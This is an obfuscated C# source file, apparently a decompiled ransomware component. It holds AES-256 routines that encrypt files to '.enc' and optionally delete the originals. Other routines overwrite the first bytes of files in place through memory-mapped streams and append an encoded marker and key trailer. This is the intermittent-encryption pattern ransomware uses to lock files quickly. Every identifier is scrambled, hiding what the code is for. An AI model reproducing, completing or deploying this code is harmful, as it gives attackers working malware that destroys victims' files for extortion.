using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace LSMgrTguKYchoUzfqQ;

public static class NLyEBDclVkby
{
	public const int NgxVmRvVSMgo = 256;

	public static byte[] vvWaKzUQnMUTEMqc(int YGUzgchQsSHN)
	{
		byte[] array = new byte[YGUzgchQsSHN];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		rNGCryptoServiceProvider.GetBytes(array);
		return array;
	}

	public static bool eIXyrUBvKZFsMFMY(string bcomShtumOLJo, byte[] kgcNhCVLqTEcVTEI, bool jCeNFfgSLLmAG)
	{
		byte[] array = vvWaKzUQnMUTEMqc(16);
		using FileStream fileStream = new FileStream(bcomShtumOLJo + ".enc", FileMode.Create);
		Rfc2898DeriveBytes rfc2898DeriveBytes = CYjdwnnjXwM(kgcNhCVLqTEcVTEI, array);
		kgcNhCVLqTEcVTEI = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
		using FileStream fileStream2 = new FileStream(bcomShtumOLJo, FileMode.Open);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			if (jCeNFfgSLLmAG)
			{
				File.Delete(bcomShtumOLJo);
			}
			cryptoStream.Close();
			fileStream.Close();
			fileStream2.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool kBzXdYeGHCsZBB(string vPcwhstrLNFJY, byte[] aTcLqiMNfflv, bool MMyaiWhHPkpBcp)
	{
		byte[] array = new byte[16];
		using FileStream fileStream = new FileStream(vPcwhstrLNFJY, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		Rfc2898DeriveBytes rfc2898DeriveBytes = CYjdwnnjXwM(aTcLqiMNfflv, array);
		aTcLqiMNfflv = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateDecryptor(), CryptoStreamMode.Read);
		using FileStream fileStream2 = new FileStream(vPcwhstrLNFJY.Remove(vPcwhstrLNFJY.Length - 4), FileMode.Create);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			while (cryptoStream.Read(array2, 0, array2.Length) > 0)
			{
				fileStream2.Write(array2, 0, array2.Length);
			}
			cryptoStream.FlushFinalBlock();
			fileStream2.Close();
			fileStream.Close();
			cryptoStream.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static byte[] uLYqguvCGZXF(byte[] HIyUtbdxliGi, byte[] UhaItvOlrJGhOfZrYnk, byte[] EVZcsSxRyJO)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = CYjdwnnjXwM(UhaItvOlrJGhOfZrYnk, EVZcsSxRyJO);
		UhaItvOlrJGhOfZrYnk = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(HIyUtbdxliGi, 0, HIyUtbdxliGi.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static byte[] ZDFAonOzWK(byte[] iPezQsGAkXxTeSZ, byte[] JsWyQDkCHgTWT, byte[] bRGHaktBpCO)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = CYjdwnnjXwM(JsWyQDkCHgTWT, bRGHaktBpCO);
		JsWyQDkCHgTWT = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(iPezQsGAkXxTeSZ, 0, iPezQsGAkXxTeSZ.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static bool VYzUigRPvLkQ(byte[] IkOyuYuQFMYcASvm, byte[] ijwykkGuufxf, byte[] tzZiFAgSYC)
	{
		using Rfc2898DeriveBytes rfc2898DeriveBytes = CYjdwnnjXwM(IkOyuYuQFMYcASvm, ijwykkGuufxf);
		byte[] bytes = rfc2898DeriveBytes.GetBytes(32);
		return bytes.SequenceEqual(tzZiFAgSYC);
	}

	public static Rfc2898DeriveBytes CYjdwnnjXwM(byte[] cLWGlzNJjeoeGuHZ, byte[] LlfzStGNChj)
	{
		return new Rfc2898DeriveBytes(cLWGlzNJjeoeGuHZ, LlfzStGNChj, 52768);
	}

	public static byte[] trQgagTyanuA(string oXTTMcRpUpsUP, int KrlrbjvcaKHMrmGt)
	{
		byte[] array = new byte[KrlrbjvcaKHMrmGt];
		try
		{
			if (VSCOSikLsIYu.aLevumGFCTL == "YES")
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(oXTTMcRpUpsUP, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, KrlrbjvcaKHMrmGt);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(oXTTMcRpUpsUP, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, KrlrbjvcaKHMrmGt);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (VSCOSikLsIYu.nsUlKTEfYADHHkY)
			{
				try
				{
					File.AppendAllText(VSCOSikLsIYu.DQNgDvGHNxeJ, "File: " + oXTTMcRpUpsUP + " - Error while reading from file: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(oXTTMcRpUpsUP, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, KrlrbjvcaKHMrmGt);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void aMuoWrgJGubRR(string ERhyBPUuEpFw, byte[] BwoldggmWz, byte[] QkwxraZpWpqtj = null)
	{
		try
		{
			byte[] array = null;
			if (VSCOSikLsIYu.aLevumGFCTL == "YES")
			{
				array = (VSCOSikLsIYu.UAlXLRmTzVC ? Encoding.ASCII.GetBytes(VSCOSikLsIYu.AKDOdYwKlSeS(VSCOSikLsIYu.KCsMLwDmUvoNX) + VSCOSikLsIYu.AKDOdYwKlSeS("Kw==") + Convert.ToString(VSCOSikLsIYu.ZfdjrMLRfIrcx) + VSCOSikLsIYu.AKDOdYwKlSeS("Kw==")) : Encoding.ASCII.GetBytes(VSCOSikLsIYu.AKDOdYwKlSeS(VSCOSikLsIYu.KCsMLwDmUvoNX) + VSCOSikLsIYu.AKDOdYwKlSeS("LQ==") + Convert.ToString(VSCOSikLsIYu.ZfdjrMLRfIrcx) + VSCOSikLsIYu.AKDOdYwKlSeS("LQ==")));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(ERhyBPUuEpFw, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(BwoldggmWz, 0, BwoldggmWz.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(ERhyBPUuEpFw, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!VSCOSikLsIYu.UAlXLRmTzVC)
				{
					fileStream.Write(array, 0, array.Length);
					return;
				}
				fileStream.Write(QkwxraZpWpqtj, 0, QkwxraZpWpqtj.Length);
				fileStream.Write(array, 0, array.Length);
				return;
			}
			array = (VSCOSikLsIYu.UAlXLRmTzVC ? Encoding.ASCII.GetBytes(VSCOSikLsIYu.AKDOdYwKlSeS(VSCOSikLsIYu.KCsMLwDmUvoNX) + VSCOSikLsIYu.AKDOdYwKlSeS("Kw==") + Convert.ToString(VSCOSikLsIYu.ZfdjrMLRfIrcx) + VSCOSikLsIYu.AKDOdYwKlSeS("Kw==")) : Encoding.ASCII.GetBytes(VSCOSikLsIYu.AKDOdYwKlSeS(VSCOSikLsIYu.KCsMLwDmUvoNX) + VSCOSikLsIYu.AKDOdYwKlSeS("LQ==") + Convert.ToString(VSCOSikLsIYu.ZfdjrMLRfIrcx) + VSCOSikLsIYu.AKDOdYwKlSeS("LQ==")));
			FileStream fileStream2 = new FileStream(ERhyBPUuEpFw, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream2.Write(BwoldggmWz, 0, BwoldggmWz.Length);
			fileStream2.Close();
			fileStream2.Dispose();
			using FileStream fileStream3 = new FileStream(ERhyBPUuEpFw, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!VSCOSikLsIYu.UAlXLRmTzVC)
			{
				fileStream3.Write(array, 0, array.Length);
				return;
			}
			fileStream3.Write(QkwxraZpWpqtj, 0, QkwxraZpWpqtj.Length);
			fileStream3.Write(array, 0, array.Length);
		}
		catch (Exception ex)
		{
			if (VSCOSikLsIYu.nsUlKTEfYADHHkY)
			{
				try
				{
					File.AppendAllText(VSCOSikLsIYu.DQNgDvGHNxeJ, "File: " + ERhyBPUuEpFw + " - Error while partial writing to file: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (VSCOSikLsIYu.UAlXLRmTzVC ? Encoding.ASCII.GetBytes(VSCOSikLsIYu.AKDOdYwKlSeS(VSCOSikLsIYu.KCsMLwDmUvoNX) + VSCOSikLsIYu.AKDOdYwKlSeS("Kw==") + Convert.ToString(VSCOSikLsIYu.ZfdjrMLRfIrcx) + VSCOSikLsIYu.AKDOdYwKlSeS("Kw==")) : Encoding.ASCII.GetBytes(VSCOSikLsIYu.AKDOdYwKlSeS(VSCOSikLsIYu.KCsMLwDmUvoNX) + VSCOSikLsIYu.AKDOdYwKlSeS("LQ==") + Convert.ToString(VSCOSikLsIYu.ZfdjrMLRfIrcx) + VSCOSikLsIYu.AKDOdYwKlSeS("LQ==")));
			FileStream fileStream4 = new FileStream(ERhyBPUuEpFw, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(BwoldggmWz, 0, BwoldggmWz.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(ERhyBPUuEpFw, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!VSCOSikLsIYu.UAlXLRmTzVC)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(QkwxraZpWpqtj, 0, QkwxraZpWpqtj.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}
}
